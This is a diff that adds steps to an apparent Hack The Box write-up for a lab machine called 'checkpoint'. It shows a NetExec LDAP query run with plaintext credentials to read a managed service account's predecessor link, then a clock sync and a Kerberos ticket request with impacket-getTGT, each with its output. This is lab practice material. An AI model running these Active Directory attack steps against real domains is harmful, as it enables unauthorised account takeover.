@@ -1101,3 +1101,31 @@ kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail:
 ╰─                                                                                                               ─╯
 
 ```
+
+``` bash
+
+❯ nxc ldap 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --query '(sAMAccountName=svc_pwn$)' 'distinguishedName msDS-ManagedAccountPrecededByLink'
+LDAP        10.129.113.22   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
+LDAP        10.129.113.22   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
+LDAP        10.129.113.22   389    DC01             [+] Response for object: CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
+LDAP        10.129.113.22   389    DC01             distinguishedName    CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
+LDAP        10.129.113.22   389    DC01             msDS-ManagedAccountPrecededByLink CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                           ✔ │ 14s ─╮
+╰─                                                                                                               ─╯
+
+```
+
+``` bash
+
+❯ sudo ntpdate 10.129.113.22
+
+2026-08-29 05:04:01.315246 (+0200) +25144.841347 +/- 0.020970 10.129.113.22 s1 no-leap
+CLOCK: time stepped by 25144.841347
+❯ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.113.22
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in alex.turner.ccache
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                            ✔ │ 4s ─╮
+╰─                                                                                                               ─╯
+
+```
